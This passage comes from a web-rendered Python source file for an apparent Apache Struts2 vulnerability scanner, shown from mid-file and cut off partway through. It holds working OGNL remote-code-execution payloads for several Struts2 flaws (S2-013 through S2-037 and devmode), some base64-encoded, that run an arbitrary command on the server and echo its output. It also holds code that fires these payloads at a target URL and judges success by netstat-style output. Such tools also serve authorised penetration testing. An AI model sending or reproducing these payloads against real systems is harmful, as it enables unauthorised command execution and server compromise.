class="pl-c1">%40g</span>etResponse<span class="pl-c1">%28%</span>29.getWriter<span class="pl-c1">%28%</span>29<span class="pl-c1">%2c%23s</span>btest.println<span class="pl-c1">%28%</span>23d<span class="pl-c1">%29%</span>2c<span class="pl-c1">%23s</span>btest.close<span class="pl-c1">%28%</span>29<span class="pl-c1">%29%</span>28meh%29&amp;z[<span class="pl-c1">%28c</span>lass.classLoader.jarPath<span class="pl-c1">%29%</span>28%27meh<span class="pl-c1">%27%</span>29]<span class="pl-pds">&#39;&#39;&#39;</span></span>,</td>
      </tr>
      <tr>
        <td id="L55" class="blob-num js-line-number" data-line-number="55"></td>
        <td id="LC55" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-013<span class="pl-pds">&quot;</span></span>:base64.b64decode(<span class="pl-s"><span class="pl-pds">&quot;</span>YT0xJHsoJTIzX21lbWJlckFjY2Vzc1siYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MiXT10cnVlLCUyM2E9QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKCdGVVpaSU5HQ09NTUFORCcpLmdldElucHV0U3RyZWFtKCksJTIzYj1uZXcramF2YS5pby5JbnB1dFN0cmVhbVJlYWRlciglMjNhKSwlMjNjPW5ldytqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCUyM2IpLCUyM2Q9bmV3K2NoYXJbNTAwMDBdLCUyM2MucmVhZCglMjNkKSwlMjNzYnRlc3Q9QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldFdyaXRlcigpLCUyM3NidGVzdC5wcmludGxuKCUyM2QpLCUyM3NidGVzdC5jbG9zZSgpKX0=<span class="pl-pds">&quot;</span></span>),</td>
      </tr>
      <tr>
        <td id="L56" class="blob-num js-line-number" data-line-number="56"></td>
        <td id="LC56" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-016<span class="pl-pds">&quot;</span></span>:base64.b64decode(<span class="pl-s"><span class="pl-pds">&quot;</span>cmVkaXJlY3Q6JHslMjNyZXElM2QlMjNjb250ZXh0LmdldCglMjdjbyUyNyUyYiUyN20ub3BlbiUyNyUyYiUyN3N5bXBob255Lnh3byUyNyUyYiUyN3JrMi5kaXNwJTI3JTJiJTI3YXRjaGVyLkh0dHBTZXIlMjclMmIlMjd2bGV0UmVxJTI3JTJiJTI3dWVzdCUyNyksJTIzcyUzZG5ldyUyMGphdmEudXRpbC5TY2FubmVyKChuZXclMjBqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIoJTI3RlVaWklOR0NPTU1BTkQlMjcudG9TdHJpbmcoKS5zcGxpdCglMjdcXHMlMjcpKSkuc3RhcnQoKS5nZXRJbnB1dFN0cmVhbSgpKS51c2VEZWxpbWl0ZXIoJTI3XFxBJTI3KSwlMjNzdHIlM2QlMjNzLmhhc05leHQoKT8lMjNzLm5leHQoKTolMjclMjcsJTIzcmVzcCUzZCUyM2NvbnRleHQuZ2V0KCUyN2NvJTI3JTJiJTI3bS5vcGVuJTI3JTJiJTI3c3ltcGhvbnkueHdvJTI3JTJiJTI3cmsyLmRpc3AlMjclMmIlMjdhdGNoZXIuSHR0cFNlciUyNyUyYiUyN3ZsZXRSZXMlMjclMmIlMjdwb25zZSUyNyksJTIzcmVzcC5zZXRDaGFyYWN0ZXJFbmNvZGluZyglMjdVVEYtOCUyNyksJTIzcmVzcC5nZXRXcml0ZXIoKS5wcmludGxuKCUyM3N0ciksJTIzcmVzcC5nZXRXcml0ZXIoKS5mbHVzaCgpLCUyM3Jlc3AuZ2V0V3JpdGVyKCkuY2xvc2UoKX0=<span class="pl-pds">&quot;</span></span>),</td>
      </tr>
      <tr>
        <td id="L57" class="blob-num js-line-number" data-line-number="57"></td>
        <td id="LC57" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-019<span class="pl-pds">&quot;</span></span>:base64.b64decode(<span class="pl-s"><span class="pl-pds">&quot;</span>ZGVidWc9Y29tbWFuZCZleHByZXNzaW9uPSNmPSNfbWVtYmVyQWNjZXNzLmdldENsYXNzKCkuZ2V0RGVjbGFyZWRGaWVsZCgnYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MnKSwjZi5zZXRBY2Nlc3NpYmxlKHRydWUpLCNmLnNldCgjX21lbWJlckFjY2Vzcyx0cnVlKSwjcmVxPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVxdWVzdCgpLCNyZXNwPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVzcG9uc2UoKS5nZXRXcml0ZXIoKSwjYT0obmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcihuZXcgamF2YS5sYW5nLlN0cmluZ1tdeydGVVpaSU5HQ09NTUFORCd9KSkuc3RhcnQoKSwjYj0jYS5nZXRJbnB1dFN0cmVhbSgpLCNjPW5ldyBqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyKCNiKSwjZD1uZXcgamF2YS5pby5CdWZmZXJlZFJlYWRlcigjYyksI2U9bmV3IGNoYXJbMTAwMDBdLCNkLnJlYWQoI2UpLCNyZXNwLnByaW50bG4oI2UpLCNyZXNwLmNsb3NlKCk=<span class="pl-pds">&quot;</span></span>),</td>
      </tr>
      <tr>
        <td id="L58" class="blob-num js-line-number" data-line-number="58"></td>
        <td id="LC58" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-devmode<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&#39;&#39;&#39;</span>?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)<span class="pl-c1">%3f</span>(<span class="pl-c1">%23c</span>ontext%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;command=FUZZINGCOMMAND<span class="pl-pds">&#39;&#39;&#39;</span></span>,</td>
      </tr>
      <tr>
        <td id="L59" class="blob-num js-line-number" data-line-number="59"></td>
        <td id="LC59" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-032<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&#39;&#39;&#39;</span>?method:%23_memberAccess<span class="pl-c1">%3d</span>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,<span class="pl-c1">%23r</span>es<span class="pl-c1">%3d%40o</span>rg.apache.struts2.ServletActionContext<span class="pl-c1">%40g</span>etResponse(),<span class="pl-c1">%23r</span>es.setCharacterEncoding(%23parameters.encoding[0]),%23w<span class="pl-c1">%3d%23r</span>es.getWriter(),<span class="pl-c1">%23s%3d</span>new+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),<span class="pl-c1">%23s</span>tr<span class="pl-c1">%3d%23s</span>.hasNext()<span class="pl-c1">%3f%23s</span>.next()<span class="pl-c1">%3a</span>%23parameters.ppp[0],%23w.print(<span class="pl-c1">%23s</span>tr),%23w.close(),1?<span class="pl-c1">%23x</span>x:<span class="pl-c1">%23r</span>equest.toString&amp;cmd=FUZZINGCOMMAND&amp;pp=____A&amp;ppp=%20&amp;encoding=UTF-8<span class="pl-pds">&#39;&#39;&#39;</span></span>,</td>
      </tr>
      <tr>
        <td id="L60" class="blob-num js-line-number" data-line-number="60"></td>
        <td id="LC60" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-033<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&#39;&#39;&#39;</span>/%23_memberAccess<span class="pl-c1">%3d</span>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,<span class="pl-c1">%23x</span>x<span class="pl-c1">%3d</span>123,<span class="pl-c1">%23r</span>s<span class="pl-c1">%3d</span>@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr<span class="pl-c1">%3d%23c</span>ontext[%23parameters.obj[0]].getWriter(),%23wr.print(<span class="pl-c1">%23r</span>s),%23wr.close(),<span class="pl-c1">%23x</span>x.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=FUZZINGCOMMAND<span class="pl-pds">&#39;&#39;&#39;</span></span>,</td>
      </tr>
      <tr>
        <td id="L61" class="blob-num js-line-number" data-line-number="61"></td>
        <td id="LC61" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-037<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&#39;&#39;&#39;</span>/(%23_memberAccess<span class="pl-c1">%3d</span>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)<span class="pl-c1">%3f</span>(%23wr<span class="pl-c1">%3d%23c</span>ontext%5b%23parameters.obj%5b0<span class="pl-c1">%5d%5d</span>.getWriter(),<span class="pl-c1">%23r</span>s<span class="pl-c1">%3d</span>@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(<span class="pl-c1">%23r</span>s),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=16456&amp;command=FUZZINGCOMMAND<span class="pl-pds">&#39;&#39;&#39;</span></span>,</td>
      </tr>
      <tr>
        <td id="L62" class="blob-num js-line-number" data-line-number="62"></td>
        <td id="LC62" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-045<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span><span class="pl-pds">&quot;</span></span>,</td>
      </tr>
      <tr>
        <td id="L63" class="blob-num js-line-number" data-line-number="63"></td>
        <td id="LC63" class="blob-code blob-code-inner js-file-line">                }</td>
      </tr>
      <tr>
        <td id="L64" class="blob-num js-line-number" data-line-number="64"></td>
        <td id="LC64" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">def</span> <span class="pl-en">check</span>(<span class="pl-smi"><span class="pl-smi">self</span></span>, <span class="pl-smi">pocname</span>, <span class="pl-smi">vulnstr</span>):</td>
      </tr>
      <tr>
        <td id="L65" class="blob-num js-line-number" data-line-number="65"></td>
        <td id="LC65" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> vulnstr.find(<span class="pl-s"><span class="pl-pds">&quot;</span>Active Internet connections<span class="pl-pds">&quot;</span></span>) <span class="pl-k">is</span> <span class="pl-k">not</span> <span class="pl-k">-</span><span class="pl-c1">1</span>:</td>
      </tr>
      <tr>
        <td id="L66" class="blob-num js-line-number" data-line-number="66"></td>
        <td id="LC66" class="blob-code blob-code-inner js-file-line">            cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>目标存在<span class="pl-pds">&quot;</span></span> <span class="pl-k">+</span> pocname <span class="pl-k">+</span> <span class="pl-s"><span class="pl-pds">&quot;</span>漏洞..[Linux]<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>red<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L67" class="blob-num js-line-number" data-line-number="67"></td>
        <td id="LC67" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">elif</span> vulnstr.find(<span class="pl-s"><span class="pl-pds">&quot;</span>Active Connections<span class="pl-pds">&quot;</span></span>) <span class="pl-k">is</span> <span class="pl-k">not</span> <span class="pl-k">-</span><span class="pl-c1">1</span>:</td>
      </tr>
      <tr>
        <td id="L68" class="blob-num js-line-number" data-line-number="68"></td>
        <td id="LC68" class="blob-code blob-code-inner js-file-line">            cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>目标存在<span class="pl-pds">&quot;</span></span> <span class="pl-k">+</span> pocname <span class="pl-k">+</span> <span class="pl-s"><span class="pl-pds">&quot;</span>漏洞..[Windows]<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>red<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L69" class="blob-num js-line-number" data-line-number="69"></td>
        <td id="LC69" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">elif</span> vulnstr.find(<span class="pl-s"><span class="pl-pds">&quot;</span>活动连接<span class="pl-pds">&quot;</span></span>) <span class="pl-k">is</span> <span class="pl-k">not</span> <span class="pl-k">-</span><span class="pl-c1">1</span>:</td>
      </tr>
      <tr>
        <td id="L70" class="blob-num js-line-number" data-line-number="70"></td>
        <td id="LC70" class="blob-code blob-code-inner js-file-line">            cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>目标存在<span class="pl-pds">&quot;</span></span> <span class="pl-k">+</span> pocname <span class="pl-k">+</span> <span class="pl-s"><span class="pl-pds">&quot;</span>漏洞..[Windows]<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>red<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L71" class="blob-num js-line-number" data-line-number="71"></td>
        <td id="LC71" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">elif</span> vulnstr.find(<span class="pl-s"><span class="pl-pds">&quot;</span>LISTEN<span class="pl-pds">&quot;</span></span>) <span class="pl-k">is</span> <span class="pl-k">not</span> <span class="pl-k">-</span><span class="pl-c1">1</span>:</td>
      </tr>
      <tr>
        <td id="L72" class="blob-num js-line-number" data-line-number="72"></td>
        <td id="LC72" class="blob-code blob-code-inner js-file-line">            cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>目标存在<span class="pl-pds">&quot;</span></span> <span class="pl-k">+</span> pocname <span class="pl-k">+</span> <span class="pl-s"><span class="pl-pds">&quot;</span>漏洞..[未知OS]<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>red<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L73" class="blob-num js-line-number" data-line-number="73"></td>
        <td id="LC73" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">else</span>:</td>
      </tr>
      <tr>
        <td id="L74" class="blob-num js-line-number" data-line-number="74"></td>
        <td id="LC74" class="blob-code blob-code-inner js-file-line">            cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>目标不存在<span class="pl-pds">&quot;</span></span> <span class="pl-k">+</span> pocname <span class="pl-k">+</span><span class="pl-s"><span class="pl-pds">&quot;</span>漏洞..<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>green<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L75" class="blob-num js-line-number" data-line-number="75"></td>
        <td id="LC75" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L76" class="blob-num js-line-number" data-line-number="76"></td>
        <td id="LC76" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">def</span> <span class="pl-en">scan</span>(<span class="pl-smi"><span class="pl-smi">self</span></span>):</td>
      </tr>
      <tr>
        <td id="L77" class="blob-num js-line-number" data-line-number="77"></td>
        <td id="LC77" class="blob-code blob-code-inner js-file-line">        cprint(<span class="pl-s"><span class="pl-pds">&#39;&#39;&#39;</span></span></td>
      </tr>
      <tr>
        <td id="L78" class="blob-num js-line-number" data-line-number="78"></td>
        <td id="LC78" class="blob-code blob-code-inner js-file-line"><span class="pl-s"> ____  _              _            ____                  </span></td>
      </tr>
      <tr>
        <td id="L79" class="blob-num js-line-number" data-line-number="79"></td>
        <td id="LC79" class="blob-code blob-code-inner js-file-line"><span class="pl-s">/ ___|| |_ _ __ _   _| |_ ___     / ___|  ___ __ _ _ __  </span></td>
      </tr>
      <tr>
        <td id="L80" class="blob-num js-line-number" data-line-number="80"></td>
        <td id="LC80" class="blob-code blob-code-inner js-file-line"><span class="pl-s">\___ \| __| &#39;__| | | | __/ __|____\___ \ / __/ _` | &#39;_ \ </span></td>
      </tr>
      <tr>
        <td id="L81" class="blob-num js-line-number" data-line-number="81"></td>
        <td id="LC81" class="blob-code blob-code-inner js-file-line"><span class="pl-s"> ___) | |_| |  | |_| | |_\__ \_____|__) | (_| (_| | | | |</span></td>
      </tr>
      <tr>
        <td id="L82" class="blob-num js-line-number" data-line-number="82"></td>
        <td id="LC82" class="blob-code blob-code-inner js-file-line"><span class="pl-s">|____/ \__|_|   \__,_|\__|___/    |____/ \___\__,_|_| |_|</span></td>
      </tr>
      <tr>
        <td id="L83" class="blob-num js-line-number" data-line-number="83"></td>
        <td id="LC83" class="blob-code blob-code-inner js-file-line"><span class="pl-s">                                        Code by Lucifer.</span></td>
      </tr>
      <tr>
        <td id="L84" class="blob-num js-line-number" data-line-number="84"></td>
        <td id="LC84" class="blob-code blob-code-inner js-file-line"><span class="pl-s">            <span class="pl-pds">&#39;&#39;&#39;</span></span>, <span class="pl-s"><span class="pl-pds">&#39;</span>cyan<span class="pl-pds">&#39;</span></span>)</td>
      </tr>
      <tr>
        <td id="L85" class="blob-num js-line-number" data-line-number="85"></td>
        <td id="LC85" class="blob-code blob-code-inner js-file-line">        cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>-------检测struts2漏洞--------<span class="pl-cce">\n</span>目标url:<span class="pl-pds">&quot;</span></span><span class="pl-k">+</span><span class="pl-c1">self</span>.url, <span class="pl-s"><span class="pl-pds">&quot;</span>cyan<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L86" class="blob-num js-line-number" data-line-number="86"></td>
        <td id="LC86" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L87" class="blob-num js-line-number" data-line-number="87"></td>
        <td id="LC87" class="blob-code blob-code-inner js-file-line">            req <span class="pl-k">=</span> requests.post(<span class="pl-c1">self</span>.url, <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">data</span><span class="pl-k">=</span><span class="pl-c1">self</span>.poc[<span class="pl-s"><span class="pl-pds">&#39;</span>ST2-005<span class="pl-pds">&#39;</span></span>], <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L88" class="blob-num js-line-number" data-line-number="88"></td>
        <td id="LC88" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">self</span>.check(<span class="pl-s"><span class="pl-pds">&quot;</span>struts2-005<span class="pl-pds">&quot;</span></span>, req.text)</td>
      </tr>
      <tr>
        <td id="L89" class="blob-num js-line-number" data-line-number="89"></td>
        <td id="LC89" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L90" class="blob-num js-line-number" data-line-number="90"></td>
        <td id="LC90" class="blob-code blob-code-inner js-file-line">            cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>检测struts2-005超时..<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>cyan<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L91" class="blob-num js-line-number" data-line-number="91"></td>
        <td id="LC91" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L92" class="blob-num js-line-number" data-line-number="92"></td>
        <td id="LC92" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L93" class="blob-num js-line-number" data-line-number="93"></td>
        <td id="LC93" class="blob-code blob-code-inner js-file-line">            req <span class="pl-k">=</span> requests.post(<span class="pl-c1">self</span>.url, <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">data</span><span class="pl-k">=</span><span class="pl-c1">self</span>.poc[<span class="pl-s"><span class="pl-pds">&#39;</span>ST2-009<span class="pl-pds">&#39;</span></span>], <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L94" class="blob-num js-line-number" data-line-number="94"></td>
        <td id="LC94" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">self</span>.check(<span class="pl-s"><span class="pl-pds">&quot;</span>struts2-009<span class="pl-pds">&quot;</span></span>, req.text)</td>
      </tr>
      <tr>
        <td id="L95" class="blob-num js-line-number" data-line-number="95"></td>
        <td id="LC95" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L96" class="blob-num js-line-number" data-line-number="96"></td>
        <td id="LC96" class="blob-code blob-code-inner js-file-line">            cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>检测struts2-009超时..<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>cyan<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L97" class="blob-num js-line-number" data-line-number="97"></td>
        <td id="LC97" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L98" class="blob-num js-line-number" data-line-number="98"></td>
        <td id="LC98" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L99" class="blob-num js-line-number" data-line-number="99"></td>
        <td id="LC99" class="blob-code blob-code-inner js-file-line">            req <span class="pl-k">=</span> requests.post(<span class="pl-c1">self</span>.url, <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">data</span><span class="pl-k">=</span><span class="pl-c1">self</span>.poc[<span class="pl-s"><span class="pl-pds">&#39;</span>ST2-013<span class="pl-pds">&#39;</span></span>], <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L100" class="blob-num js-line-number" data-line-number="100"></td>
        <td id="LC100" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">self</span>.check(<span class="pl-s"><span class="pl-pds">&quot;</span>struts2-013<span class="pl-pds">&quot;</span></span>, req.text)</td>
      </tr>
      <tr>
        <td id="L101" class="blob-num js-line-number" data-line-number="101"></td>
        <td id="LC101" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L102" class="blob-num js-line-number" data-line-number="102"></td>
        <td id="LC102" class="blob-code blob-code-inner js-file-line">            cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>检测struts2-013超时..<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>cyan<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L103" class="blob-num js-line-number" data-line-number="103"></td>
        <td id="LC103" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L104" class="blob-num js-line-number" data-line-number="104"></td>
        <td id="LC104" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L105" class="blob-num js-line-number" data-line-number="105"></td>
        <td id="LC105" class="blob-code blob-code-inner js-file-line">            req <span class="pl-k">=</span> requests.post(<span class="pl-c1">self</span>.url, <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">data</span><span class="pl-k">=</span><span class="pl-c1">self</span>.poc[<span class="pl-s"><span class="pl-pds">&#39;</span>ST2-016<span class="pl-pds">&#39;</span></span>], <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L106" class="blob-num js-line-number" data-line-number="106"></td>
        <td id="LC106" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">self</span>.check(<span class="pl-s"><span class="pl-pds">&quot;</span>struts2-016<span class="pl-pds">&quot;</span></span>, req.text)</td>
      </tr>
      <tr>
        <td id="L107" class="blob-num js-line-number" data-line-number="107"></td>
        <td id="LC107" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L108" class="blob-num js-line-number" data-line-number="108"></td>
        <td id="LC108" class="blob-code blob-code-inner js-file-line">            cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>检测struts2-016超时..<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>cyan<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L109" class="blob-num js-line-number" data-line-number="109"></td>
        <td id="LC109" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L110" class="blob-num js-line-number" data-line-number="110"></td>
        <td id="LC110" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L111" class="blob-num js-line-number" data-line-number="111"></td>
        <td id="LC111" class="blob-code blob-code-inner js-file-line">            req <span class="pl-k">=</span> requests.post(<span class="pl-c1">self</span>.url, <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">data</span><span class="pl-k">=</span><span class="pl-c1">self</span>.poc[<span class="pl-s"><span class="pl-pds">&#39;</span>ST2-019<span class="pl-pds">&#39;</span></span>], <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L112" class="blob-num js-line-number" data-line-number="112"></td>
        <td id="LC112" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">self</span>.check(<span class="pl-s"><span class="pl-pds">&quot;</span>struts2-019<span class="pl-pds">&quot;</span></span>, req.text)</td>
      </tr>
      <tr>
        <td id="L113" class="blob-num js-line-number" data-line-number="113"></td>
        <td id="LC113" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L114" class="blob-num js-line-number" data-line-number="114"></td>
        <td id="LC114" class="blob-code blob-code-inner js-file-line">            cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>检测struts2-019超时..<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>cyan<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L115" class="blob-num js-line-number" data-line-number="115"></td>
        <td id="LC115" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L116" class="blob-num js-line-number" data-line-number="116"></td>
        <td id="LC116" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L117" class="blob-num js-line-number" data-line-number="117"></td>
        <td id="LC117" class="blob-code blob-code-inner js-file-line">            req <span class="pl-k">=</span> requests.get(<span class="pl-c1">self</span>.url<span class="pl-k">+</span><span class="pl-c1">self</span>.poc[<span class="pl-s"><span class="pl-pds">&#39;</span>ST2-devmode<span class="pl-pds">&#39;</span></span>], <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L118" class="blob-num js-line-number" data-line-number="118"></td>
        <td id="LC118" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">self</span>.check(<span class="pl-s"><span class="pl-pds">&quot;</span>struts2-devmode<span class="pl-pds">&quot;</span></span>, req.text)</td>
      </tr>
      <tr>
        <td id="L119" class="blob-num js-line-number" data-line-number="119"></td>
        <td id="LC119" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L120" class="blob-num js-line-number" data-line-number="120"></td>
        <td id="LC120" class="blob-code blob-code-inner js-file-line">            cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>检测struts2-devmode超时..<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>cyan<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L121" class="blob-num js-line-number" data-line-number="121"></td>
        <td id="LC121" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L122" class="blob-num js-line-number" data-line-number="122"></td>
        <td id="LC122" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L123" class="blob-num js-line-number" data-line-number="123"></td>
        <td id="LC123" class="blob-code blob-code-inner js-file-line">            req <span class="pl-k">=</span> requests.get(<span class="pl-c1">self</span>.url<span class="pl-k">+</span><span class="pl-c1">self</span>.poc[<span class="pl-s"><span class="pl-pds">&#39;</span>ST2-032<span class="pl-pds">&#39;</span></span>], <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L124" class="blob-num js-line-number" data-line-number="124"></td>
